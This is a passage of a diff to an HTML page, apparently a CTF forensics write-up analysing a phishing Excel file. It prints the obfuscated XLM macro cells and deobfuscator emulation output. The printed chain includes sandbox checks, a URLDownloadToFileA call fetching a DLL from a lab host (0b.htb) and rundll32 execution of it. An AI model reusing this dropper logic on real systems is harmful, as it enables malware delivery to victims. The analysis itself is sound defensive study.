+</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,R999,<span class="s2">&#34;&#34;</span>,4.00000000000000000000
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="s1">&#39; c1zB0vasN,Q1000,CONCATENATE(U410),&#34;&#34;
+</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,D1023,<span class="s2">&#34;IF(ISNUMBER(SEARCH(&#34;</span>6.1<span class="s2">&#34;,N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="s1">&#39; c1zB0vasN,D1024,GOTO(R1186),&#34;&#34;
+</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,W1026,<span class="s2">&#34;CONCATENATE(B1334,B36,H461,G1019,U1036)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="s1">&#39; c1zB0vasN,S1032,&#34;CONCATENATE(M15,T86,S187,V106,R58,P1318,C194,M440)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,S1035,<span class="s2">&#34;&#34;</span>,4.00000000000000000000
+</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="s1">&#39; c1zB0vasN,C1040,&#34;CONCATENATE(F1213,I1285,O347,X742)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,P1047,<span class="s2">&#34;CONCATENATE(H730,C801,K802,S1032,C297,B358)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="s1">&#39; c1zB0vasN,K1085,&#34;CONCATENATE(G335,Q471,W570,F615,O686,V719)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,Y1087,<span class="s2">&#34;CONCATENATE(T645,M750,N1097,V551,Z960,B994)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="s1">&#39; c1zB0vasN,R1186,GET.WORKSPACE(1),&#34;&#34;
+</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,R1187,<span class="s2">&#34;IF(NOT(ISNUMBER(SEARCH(&#34;</span>7.0<span class="s2">&#34;,R1186))),CLOSE(FALSE))&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="s1">&#39; c1zB0vasN,R1188,&#34;CALL(&#34;Kernel32&#34;,&#34;CreateDirectoryA&#34;,&#34;JCJ&#34;,&#34;C:\rncwner&#34;,0)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,R1189,<span class="s2">&#34;CALL(&#34;</span>Kernel32<span class="s2">&#34;,&#34;</span>CreateDirectoryA<span class="s2">&#34;,&#34;</span>JCJ<span class="s2">&#34;,&#34;</span>C:<span class="se">\r</span>ncwner<span class="se">\C</span>kkYKlI<span class="s2">&#34;,0)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="s1">&#39; c1zB0vasN,J1190,&#34;CONCATENATE(T1000,W1063,O1107,K1131,D517)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,R1190,<span class="s2">&#34;CALL(F1220,Q1000,&#34;</span>JJCCJJ<span class="s2">&#34;,0,H60,G1332,0,0)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="s1">&#39; c1zB0vasN,R1191,&#34;CALL(L554,I180,&#34;JJCCCCJ&#34;,0,&#34;Open&#34;,&#34;rundll32.exe&#34;,CONCATENATE(G1332,D8,D513,K390),0,0)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,R1192,GOTO<span class="o">(</span>A1338<span class="o">)</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="s1">&#39; c1zB0vasN,F1220,&#34;CONCATENATE(K1184,Y420,D450)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,K1225,<span class="s2">&#34;CONCATENATE(Q880,V1048)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="s1">&#39; c1zB0vasN,C1300,GOTO(Q222),&#34;&#34;
+</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,G1332,<span class="s2">&#34;CONCATENATE(P1047,C593,C1040)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="s1">&#39; c1zB0vasN,D1337,&#34;IF(F100&lt;300,ON.TIME(NOW()+&#34;00:00:02&#34;,A1),ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;KsshpqC4Mo&#34;))&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,A1338,<span class="s2">&#34;FORMULA.FILL(&#34;</span>a<span class="s2">&#34;,R~0C~0)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="err">&#39;</span> c1zB0vasN,A1339,HALT<span class="o">()</span>,<span class="s2">&#34;&#34;</span></span></span></code></pre></div></div>
 <p>i see</p>
 <ul>
 <li><code>CALL()</code> to Windows APIs</li>
@@ -990,42 +1077,42 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
     
 </h2>
 <p>To evaluate macro behavior, I used <code>xlmdeobfuscator</code> emulation</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ xlmdeobfuscator --file oBfsC4t10n2.xls
-</span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$ olevba oBfsC4t10n2.xls 
-</span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:N545      , PartialEvaluation   , =document.HIDE(&#34;c1zB0vasNO&#34;,TRUE)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:N546      , FullEvaluation      , GET.WORKSPACE<span style="color:#ff7b72;font-weight:bold">(</span>1<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:N547      , Branching           , IF(ISNUMBER(SEARCH(&#34;Windows&#34;,N546)),ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;agawf23f&#34;),CLOSE(FALSE))
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:N547      , FullEvaluation      , <span style="color:#ff7b72;font-weight:bold">[</span>TRUE<span style="color:#ff7b72;font-weight:bold">]</span> ON.TIME<span style="color:#ff7b72;font-weight:bold">(</span>NOW<span style="color:#ff7b72;font-weight:bold">()</span>+<span style="color:#a5d6ff">&#34;00:00:02&#34;</span>,<span style="color:#a5d6ff">&#34;agawf23f&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:D8        , Branching           , IF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:D8        , FullEvaluation      , <span style="color:#ff7b72;font-weight:bold">[</span>TRUE<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34; HTB{n0w_e&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:D9        , FullEvaluation      , GET.WORKSPACE(13)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:D10       , FullEvaluation      , GOTO<span style="color:#ff7b72;font-weight:bold">(</span>C1300<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:C1300     , FullEvaluation      , GOTO(Q222)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:Q222      , Branching           , IF<span style="color:#ff7b72;font-weight:bold">(</span>GET.WORKSPACE<span style="color:#ff7b72;font-weight:bold">(</span>19.0<span style="color:#ff7b72;font-weight:bold">)</span>,ON.TIME<span style="color:#ff7b72;font-weight:bold">(</span>NOW<span style="color:#ff7b72;font-weight:bold">()</span>+<span style="color:#a5d6ff">&#34;00:00:02&#34;</span>,<span style="color:#a5d6ff">&#34;rstegerg3&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>,CLOSE<span style="color:#ff7b72;font-weight:bold">(</span>TRUE<span style="color:#ff7b72;font-weight:bold">))</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:Q222      , FullEvaluation      , [TRUE] ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;rstegerg3&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:T698      , Branching           , IF<span style="color:#ff7b72;font-weight:bold">(</span>OR<span style="color:#ff7b72;font-weight:bold">(</span>D9&lt;700.0<span style="color:#ff7b72;font-weight:bold">)</span>,ON.TIME<span style="color:#ff7b72;font-weight:bold">(</span>NOW<span style="color:#ff7b72;font-weight:bold">()</span>+<span style="color:#a5d6ff">&#34;00:00:02&#34;</span>,A1<span style="color:#ff7b72;font-weight:bold">)</span>,ON.TIME<span style="color:#ff7b72;font-weight:bold">(</span>NOW<span style="color:#ff7b72;font-weight:bold">()</span>+<span style="color:#a5d6ff">&#34;00:00:02&#34;</span>,<span style="color:#a5d6ff">&#34;Lsl23Us7a&#34;</span><span style="color:#ff7b72;font-weight:bold">))</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:T698      , FullEvaluation      , [FALSE] ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;Lsl23Us7a&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:D1337     , Branching           , IF<span style="color:#ff7b72;font-weight:bold">(</span>F100&lt;300.0,ON.TIME<span style="color:#ff7b72;font-weight:bold">(</span>NOW<span style="color:#ff7b72;font-weight:bold">()</span>+<span style="color:#a5d6ff">&#34;00:00:02&#34;</span>,A1<span style="color:#ff7b72;font-weight:bold">)</span>,ON.TIME<span style="color:#ff7b72;font-weight:bold">(</span>NOW<span style="color:#ff7b72;font-weight:bold">()</span>+<span style="color:#a5d6ff">&#34;00:00:02&#34;</span>,<span style="color:#a5d6ff">&#34;KsshpqC4Mo&#34;</span><span style="color:#ff7b72;font-weight:bold">))</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:D1337     , FullEvaluation      , [FALSE] ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;KsshpqC4Mo&#34;)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:D1023     , Branching           , IF<span style="color:#ff7b72;font-weight:bold">(</span>ISNUMBER<span style="color:#ff7b72;font-weight:bold">(</span>SEARCH<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;6.1&#34;</span>,N546<span style="color:#ff7b72;font-weight:bold">))</span>,CONCATENATE<span style="color:#ff7b72;font-weight:bold">(</span>Z699,L932,J1190,C574,J644,A718,E813<span style="color:#ff7b72;font-weight:bold">)</span>,CONCATENATE<span style="color:#ff7b72;font-weight:bold">(</span>A699,E932,K1190,J574,A644,Z718,W813<span style="color:#ff7b72;font-weight:bold">))</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:D1023     , FullEvaluation      , [FALSE] &#34;A$0!(rR&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:D1024     , FullEvaluation      , GOTO<span style="color:#ff7b72;font-weight:bold">(</span>R1186<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:R1186     , FullEvaluation      , GET.WORKSPACE(1)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:R1187     , FullEvaluation      , IF<span style="color:#ff7b72;font-weight:bold">(</span>NOT<span style="color:#ff7b72;font-weight:bold">(</span>ISNUMBER<span style="color:#ff7b72;font-weight:bold">(</span>SEARCH<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;7.0&#34;</span>,R1186<span style="color:#ff7b72;font-weight:bold">)))</span>,CLOSE<span style="color:#ff7b72;font-weight:bold">(</span>FALSE<span style="color:#ff7b72;font-weight:bold">))</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:R1188     , FullEvaluation      , CALL(&#34;Kernel32&#34;,&#34;CreateDirectoryA&#34;,&#34;JCJ&#34;,&#34;C:\rncwner&#34;,0)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:R1189     , FullEvaluation      , CALL<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;Kernel32&#34;</span>,<span style="color:#a5d6ff">&#34;CreateDirectoryA&#34;</span>,<span style="color:#a5d6ff">&#34;JCJ&#34;</span>,<span style="color:#a5d6ff">&#34;C:\rncwner\CkkYKlI&#34;</span>,0<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:R1190     , FullEvaluation      , CALL(&#34;URLMON&#34;,&#34;URLDownloadToFileA&#34;,&#34;JJCCJJ&#34;,0,&#34;http://0b.htb/s.dll&#34;,&#34;C:\rncwner\CkuiQhTXx.dll&#34;,0,0)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:R1191     , FullEvaluation      , CALL<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;Shell32&#34;</span>,<span style="color:#a5d6ff">&#34;ShellExecuteA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCCCJ&#34;</span>,0,<span style="color:#a5d6ff">&#34;Open&#34;</span>,<span style="color:#a5d6ff">&#34;rundll32.exe&#34;</span>,<span style="color:#a5d6ff">&#34;C:\rncwner\CkuiQhTXx.dllIF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))Xc3l_4.0_M4IF(ISNUMBER(SEARCH(&#34;&#34;6.1&#34;&#34;,N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))}&#34;</span>,0,0<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:R1192     , FullEvaluation      , GOTO(A1338)
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:A1338     , FullEvaluation      , FORMULA.FILL<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;a&#34;</span>,A1:Z1337<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; CELL:A1339     , End                 , HALT()
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> CELL:D1023     , FullEvaluation      , <span style="color:#ff7b72;font-weight:bold">[</span>FALSE<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;aaaaaaa&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f85149">&#39;</span> CELL:D8        , FullEvaluation      , <span style="color:#ff7b72;font-weight:bold">[</span>TRUE<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;aaaaaaaaaa&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">$ xlmdeobfuscator --file oBfsC4t10n2.xls
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">$ olevba oBfsC4t10n2.xls 
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s1">&#39; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s1">&#39;</span> EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s1">&#39; CELL:N545      , PartialEvaluation   , =document.HIDE(&#34;c1zB0vasNO&#34;,TRUE)
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s1">&#39;</span> CELL:N546      , FullEvaluation      , GET.WORKSPACE<span class="o">(</span>1<span class="o">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s1">&#39; CELL:N547      , Branching           , IF(ISNUMBER(SEARCH(&#34;Windows&#34;,N546)),ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;agawf23f&#34;),CLOSE(FALSE))
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s1">&#39;</span> CELL:N547      , FullEvaluation      , <span class="o">[</span>TRUE<span class="o">]</span> ON.TIME<span class="o">(</span>NOW<span class="o">()</span>+<span class="s2">&#34;00:00:02&#34;</span>,<span class="s2">&#34;agawf23f&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="s1">&#39; CELL:D8        , Branching           , IF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="s1">&#39;</span> CELL:D8        , FullEvaluation      , <span class="o">[</span>TRUE<span class="o">]</span> <span class="s2">&#34; HTB{n0w_e&#34;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="s1">&#39; CELL:D9        , FullEvaluation      , GET.WORKSPACE(13)
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s1">&#39;</span> CELL:D10       , FullEvaluation      , GOTO<span class="o">(</span>C1300<span class="o">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s1">&#39; CELL:C1300     , FullEvaluation      , GOTO(Q222)
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s1">&#39;</span> CELL:Q222      , Branching           , IF<span class="o">(</span>GET.WORKSPACE<span class="o">(</span>19.0<span class="o">)</span>,ON.TIME<span class="o">(</span>NOW<span class="o">()</span>+<span class="s2">&#34;00:00:02&#34;</span>,<span class="s2">&#34;rstegerg3&#34;</span><span class="o">)</span>,CLOSE<span class="o">(</span>TRUE<span class="o">))</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s1">&#39; CELL:Q222      , FullEvaluation      , [TRUE] ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;rstegerg3&#34;)
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s1">&#39;</span> CELL:T698      , Branching           , IF<span class="o">(</span>OR<span class="o">(</span>D9&lt;700.0<span class="o">)</span>,ON.TIME<span class="o">(</span>NOW<span class="o">()</span>+<span class="s2">&#34;00:00:02&#34;</span>,A1<span class="o">)</span>,ON.TIME<span class="o">(</span>NOW<span class="o">()</span>+<span class="s2">&#34;00:00:02&#34;</span>,<span class="s2">&#34;Lsl23Us7a&#34;</span><span class="o">))</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s1">&#39; CELL:T698      , FullEvaluation      , [FALSE] ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;Lsl23Us7a&#34;)
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="s1">&#39;</span> CELL:D1337     , Branching           , IF<span class="o">(</span>F100&lt;300.0,ON.TIME<span class="o">(</span>NOW<span class="o">()</span>+<span class="s2">&#34;00:00:02&#34;</span>,A1<span class="o">)</span>,ON.TIME<span class="o">(</span>NOW<span class="o">()</span>+<span class="s2">&#34;00:00:02&#34;</span>,<span class="s2">&#34;KsshpqC4Mo&#34;</span><span class="o">))</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="s1">&#39; CELL:D1337     , FullEvaluation      , [FALSE] ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;KsshpqC4Mo&#34;)
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="s1">&#39;</span> CELL:D1023     , Branching           , IF<span class="o">(</span>ISNUMBER<span class="o">(</span>SEARCH<span class="o">(</span><span class="s2">&#34;6.1&#34;</span>,N546<span class="o">))</span>,CONCATENATE<span class="o">(</span>Z699,L932,J1190,C574,J644,A718,E813<span class="o">)</span>,CONCATENATE<span class="o">(</span>A699,E932,K1190,J574,A644,Z718,W813<span class="o">))</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="s1">&#39; CELL:D1023     , FullEvaluation      , [FALSE] &#34;A$0!(rR&#34;
+</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="s1">&#39;</span> CELL:D1024     , FullEvaluation      , GOTO<span class="o">(</span>R1186<span class="o">)</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s1">&#39; CELL:R1186     , FullEvaluation      , GET.WORKSPACE(1)
+</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="s1">&#39;</span> CELL:R1187     , FullEvaluation      , IF<span class="o">(</span>NOT<span class="o">(</span>ISNUMBER<span class="o">(</span>SEARCH<span class="o">(</span><span class="s2">&#34;7.0&#34;</span>,R1186<span class="o">)))</span>,CLOSE<span class="o">(</span>FALSE<span class="o">))</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="s1">&#39; CELL:R1188     , FullEvaluation      , CALL(&#34;Kernel32&#34;,&#34;CreateDirectoryA&#34;,&#34;JCJ&#34;,&#34;C:\rncwner&#34;,0)
+</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="s1">&#39;</span> CELL:R1189     , FullEvaluation      , CALL<span class="o">(</span><span class="s2">&#34;Kernel32&#34;</span>,<span class="s2">&#34;CreateDirectoryA&#34;</span>,<span class="s2">&#34;JCJ&#34;</span>,<span class="s2">&#34;C:\rncwner\CkkYKlI&#34;</span>,0<span class="o">)</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="s1">&#39; CELL:R1190     , FullEvaluation      , CALL(&#34;URLMON&#34;,&#34;URLDownloadToFileA&#34;,&#34;JJCCJJ&#34;,0,&#34;http://0b.htb/s.dll&#34;,&#34;C:\rncwner\CkuiQhTXx.dll&#34;,0,0)
+</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="s1">&#39;</span> CELL:R1191     , FullEvaluation      , CALL<span class="o">(</span><span class="s2">&#34;Shell32&#34;</span>,<span class="s2">&#34;ShellExecuteA&#34;</span>,<span class="s2">&#34;JJCCCCJ&#34;</span>,0,<span class="s2">&#34;Open&#34;</span>,<span class="s2">&#34;rundll32.exe&#34;</span>,<span class="s2">&#34;C:\rncwner\CkuiQhTXx.dllIF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))Xc3l_4.0_M4IF(ISNUMBER(SEARCH(&#34;&#34;6.1&#34;&#34;,N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))}&#34;</span>,0,0<span class="o">)</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="s1">&#39; CELL:R1192     , FullEvaluation      , GOTO(A1338)
+</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="s1">&#39;</span> CELL:A1338     , FullEvaluation      , FORMULA.FILL<span class="o">(</span><span class="s2">&#34;a&#34;</span>,A1:Z1337<span class="o">)</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="s1">&#39; CELL:A1339     , End                 , HALT()
+</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="s1">&#39;</span> CELL:D1023     , FullEvaluation      , <span class="o">[</span>FALSE<span class="o">]</span> <span class="s2">&#34;aaaaaaa&#34;</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="err">&#39;</span> CELL:D8        , FullEvaluation      , <span class="o">[</span>TRUE<span class="o">]</span> <span class="s2">&#34;aaaaaaaaaa&#34;</span></span></span></code></pre></div></div>
 <p>The deobfuscated stream reveals the following behavior:</p>
 <ol>
 <li>Hiding the document: document.HIDE(&ldquo;c1zB0vasNO&rdquo;,TRUE)</li>
@@ -1040,16 +1127,16 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
 <ol start="3">
 <li>It attempts to create a directory structure on the C: drive.</li>
 </ol>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Kernel32&#34;</span>,<span style="color:#a5d6ff">&#34;CreateDirectoryA&#34;</span>,<span style="color:#a5d6ff">&#34;JCJ&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner&#34;</span>,<span style="color:#a5d6ff">0</span>)
-</span></span><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Kernel32&#34;</span>,<span style="color:#a5d6ff">&#34;CreateDirectoryA&#34;</span>,<span style="color:#a5d6ff">&#34;JCJ&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkkYKlI&#34;</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">CALL</span><span class="p">(</span><span class="s2">&#34;Kernel32&#34;</span><span class="p">,</span><span class="s2">&#34;CreateDirectoryA&#34;</span><span class="p">,</span><span class="s2">&#34;JCJ&#34;</span><span class="p">,</span><span class="s2">&#34;C:</span><span class="se">\r</span><span class="s2">ncwner&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">CALL</span><span class="p">(</span><span class="s2">&#34;Kernel32&#34;</span><span class="p">,</span><span class="s2">&#34;CreateDirectoryA&#34;</span><span class="p">,</span><span class="s2">&#34;JCJ&#34;</span><span class="p">,</span><span class="s2">&#34;C:</span><span class="se">\r</span><span class="s2">ncwner\CkkYKlI&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></div></div>
 <ol start="4">
 <li>It downloads a DLL from a remote host using URLDownloadToFileA.</li>
 </ol>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;URLMON&#34;</span>,<span style="color:#a5d6ff">&#34;URLDownloadToFileA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCJJ&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">&#34;http://0b.htb/s.dll&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkuiQhTXx.dll&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
